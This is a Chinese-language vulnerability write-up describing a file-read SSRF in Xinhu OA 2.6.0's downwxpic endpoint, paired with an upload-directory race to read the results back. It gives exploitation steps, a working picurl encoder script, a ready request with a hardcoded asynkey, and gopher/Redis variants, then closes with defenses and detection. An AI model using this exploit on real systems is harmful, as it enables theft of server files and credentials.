---
id: web-generic-ssrf-xinhu-downwxpic-picurl-file-read-race
title: 信呼OA 2.6.0 downwxpic picurl 解密后进 curl：file:// 读取本地文件并借上传目录条件竞争回读
type: scenario
domain: web
path: web/generic/ssrf
technique: xinhu-downwxpic-picurl-curl-file-read-race
aliases:
- 信呼OA 任意文件读取
- downwxpic
- downximg
- picurl 加密
- asynkey 双重 MD5
- curl file://
- createimage 条件竞争
tags:
- php
- xinhu
- ssrf
- curl
- file-scheme
- arbitrary-file-read
- race-condition
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-09'
updated: '2026-11-09'
verification:
  verified_by: verifier-V384
  verified_at: '2026-11-09T08:44:03+08:00'
  notes: 已对照原文与图片01-30核对：调用链 index->view->asynrunAction::downwxpicAction->reimModel::downximg->curlChajian::getcurl->downChajian::createimage 与截图一致；asynkey=918b1e2c90b72136d2d863c02b602726 已复算等于 md5(md5(ed60f31dc09615ccacf1502c0c2a37bf))；文章URL的picurl已解码为 base64 'ZmlsZTovLy9EOi8xLnR4dA==' -> file:///D:/1.txt，并复跑字母表脚本确认对 base64 串加密可逐字节复现该 picurl；已修正原文脚本漏掉的 base64 前置步骤（否则服务端 base64decode 得到乱码），并在原理/步骤同步说明。未在真实信呼OA实例复现条件竞争回读。
---

## 一句话结论

信呼 OA 2.6.0 的异步任务接口 `downwxpicAction` 把 `picurl` 参数解密后交给 `reimModel::downximg`，后者经 `curlChajian::getcurl` 直接 `curl_exec` 用户 URL，未限制协议；传 `file:///绝对路径` 即可读取服务器本地文件。读取到的内容由 `downChajian::createimage` 写入 `upload/` 下按日期命名的图片文件，若图片类型校验失败会被删除——攻击者用并发请求持续生成文件、同时并发猜测文件名并 GET，在删除前抢读到内容。访问需提供 `asynkey`，其值为 `md5(md5(webmainConfig 中的 asynkey))`，该配置可来自源码默认值或后台设置页。

## 原理

- **路由与调用链**：`index.php` 引入 `include/view.php`，`view.php` 按 `m`（模块/方法）、`a`、`d` 参数包含 `webmain/.../<m>Action.php`；`a=downwxpic&m=asynrun` 进入 `asynrunAction::downwxpicAction`：
  ```php
  $picurl = $this->rock->jm->uncrypt($this->get('picurl'));
  $msgid  = $this->get('msgid');
  return m('reim')->downximg($picurl, $msgid);
  ```
- **picurl 自定义加密**：`jmChajian` 的 `encrypt/uncrypt` 不是标准算法。加密时先把明文整体 base64，再把每个 base64 字符的 ASCII 十进制按位映射到字母表（如 `fdvzsakhgprcoxwuitjlbqynem`）中的下标（可加偏移量 `r`，密文最后一段即 `r`），各字符段用 `0` 分隔；解密 `uncrypt` 是逆变换（`uncrypts` 还原出 base64 串）后再 `base64decode` 得到明文。加密/解密都可离线复现（见 PoC），因此“参数加密”不构成防护。
- **curl 未限制协议**：`reimModel::downximg` 调 `c('curl')->getcurl($url)`；`curlChajian::getcurl` 仅设置 `CURLOPT_URL`、`CURLOPT_RETURNTRANSFER`、超时与可选头，没有 `CURLOPT_PROTOCOLS` 或主机白名单，`curl_exec` 支持 `http/https/dict/file/gopher` 等协议，`file://` 即本地任意文件读取。
- **落盘与条件竞争**：`downChajian::createimage($cont,'jpg','微信图片')` 先 `@file_put_contents($allfilename,$cont)` 写入 `upload/<年-月>/<月_HHMMSS><随机>.jpg`，随后用 `getimagesize` 判断 MIME；若类型与扩展名不符会 `@unlink` 并按新扩展名重写。对非图片内容存在“已写入、尚未删除”的窗口；同时文件名含时间与随机数，攻击者用并发请求制造文件名、再用并发 GET 猜 `00-99` 等随机段，命中窗口即可读回文件内容。
- **asynkey 门槛**：`asynrunAction` 构造函数校验请求的 `asynkey` 等于 `md5(md5(webmainConfig.php 中 asynkey))`。该配置是静态安装值（后台“系统设置-异步任务key”也可查看），并非每次随机；默认/未改/泄露时，攻击者可离线算出并通过校验。文章环境请求值 `918b1e2c90b72136d2d863c02b602726` 即 `md5(md5('ed60f31dc09615ccacf1502c0c2a37bf'))`。
- **危害**：读取配置文件、数据库口令、源码、密钥等任意文件；也可把 `file://` 换成 `http://`/`gopher://` 打内网与 Redis 等服务。

## 触发条件

- 目标为信呼 OA 2.6.0（原文测试版本）或具有相同 `downwxpic/downximg/getcurl/createimage` 代码的版本。
- `index.php?a=downwxpic&m=asynrun|api&d=task` 可达，PHP 启用 curl 扩展。
- 已知 `asynkey`（源码默认值、备份/配置泄露、后台设置页可见）。
- `upload` 目录可通过 Web 访问，且攻击者能在窗口期并发访问生成的文件。
- curl 未在 `php.ini`/代码中限制协议（默认支持 `file://`）。

## 利用步骤

1. 从源码 `webmainConfig.php`、后台“系统设置”或配置泄露处取得 `asynkey`，计算请求值 `md5(md5(asynkey))`。
2. 先把目标 URL（如 `file:///D:/1.txt` 或 `file:///var/www/config.php`）做 base64，再用字母表两位索引算法加密 base64 串得到 `picurl`（服务端解密为“字母表逆变换 → base64decode”，缺少 base64 步骤会得到乱码、curl 拿不到正确 URL）。
3. 发送 `GET /index.php?a=downwxpic&m=asynrun|api&d=task&ajaxbool=false&picurl=<密文>&msgid=1&asynkey=<double-md5>`，观察响应与是否生成文件。
4. 并发发送大量上述请求以持续生成文件；同时按 `upload/<年-月>/<月_HHMMSS><00-99>.jpg` 规则并发 GET 猜测文件名，直到某次返回文件内容。
5. 用读取到的配置/凭据继续评估影响；读取后不修改目标文件。
6. 记录请求与回读证据，控制并发速率避免造成业务影响。

## PoC

```python
# 1) 生成 picurl：先 base64，再把 base64 字符按字母表两位十进制索引编码，字符间用 0 分隔
#    （原文脚本漏了 base64 一步，直接加密原始 URL 得到的 picurl 服务端 base64decode 后会变乱码）
import base64
a = "fdvzsakhgprcoxwuitjlbqynem"
b = {ch: i for i, ch in enumerate(a)}
payload = base64.b64encode("file:///D:/1.txt".encode()).decode()
out = ""
for z in payload:
    done = False
    for i in b:
        for j in b:
            if chr(int(str(b[i]) + str(b[j]))) == z:
                out += str(i) + str(j) + "0"
                done = True
                break
        if done:
            break
print(out)
```

```http
GET /index.php?a=downwxpic&m=asynrun%7Capi&d=task&ajaxbool=false&picurl=<上一步密文>&msgid=1&asynkey=918b1e2c90b72136d2d863c02b602726 HTTP/1.1
Host: target
```

```python
# 2) 条件竞争：一边持续请求生成文件，一边并发猜文件名回读
# 生成线程请求上面的 URL；读取线程 GET:
# http://target/upload/<YYYY-MM>/<MM_HHMMSS><NN>.jpg   （NN 取 00-99）
# 命中时响应体即 file:// 读取到的文件内容
```

说明：`asynkey=918b...` 是 `md5(md5('ed60f31dc09615ccacf1502c0c2a37bf'))` 的结果，来自原文测试环境配置；实际目标需替换为对应安装的 `asynkey`。

## 变体与关联

- 变体（协议）：把 `file://` 换成 `http://内网地址`、`dict://`、`gopher://` 可做内网探测/打 Redis 等；`http` 抓取的内网响应同样会落入 upload 目录，可用同一条件竞争回读。
- 变体（读取目标）：`file:///` 读源码（`webmainConfig.php` 含数据库口令与 asynkey）、备份、密钥、系统文件；Windows/Linux 路径按目标调整。
- 变体（加密绕过）：若不想复现加密算法，可从同系统其它功能抓取合法 `picurl` 样本比对，或直接调用内部 `downximg`（若存在其它入口）。
- 关联：[[web-generic-ssrf-php-curl-get-file-scheme-config-read]]（PHP curl 未限制协议的同类 file:// 读取）、[[web-generic-ssrf-php-preview-line-case-filter-lfi]]（file 协议读取与过滤绕过）、[[web-php-rce-xinhu-oa-copymode-file-write]]（同产品后台文件写入 RCE）、[[web-generic-file-upload-xinhu-openkqj-headpic-controlled-filename-write]]（同产品可控文件名写入）。

## 检测与防御

- 防御：`curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP|CURLPROTO_HTTPS)` 限制协议；对目标主机做解析后 IP 校验，拒绝回环/内网/链路本地地址；禁止 `file`/`dict`/`gopher`。
- 防御：`picurl` 不只是加密，还要签名并绑定有效期/一次性 nonce；`asynkey` 改为强随机并避免在源码中硬编码默认值，定期轮换。
- 防御：下载内容先校验图片类型再写入 Web 目录之外；临时文件使用不可预测名称并保持目录不可直接访问，避免写后删的竞争窗口。
- 检测：请求中 `picurl` 为长串 `0` 分隔密文、`asynkey` 固定值；`upload/` 下出现内容为文本/配置/脚本的 `.jpg`；短时间大量 `downwxpic` 请求与对 `upload/` 的高频枚举访问。
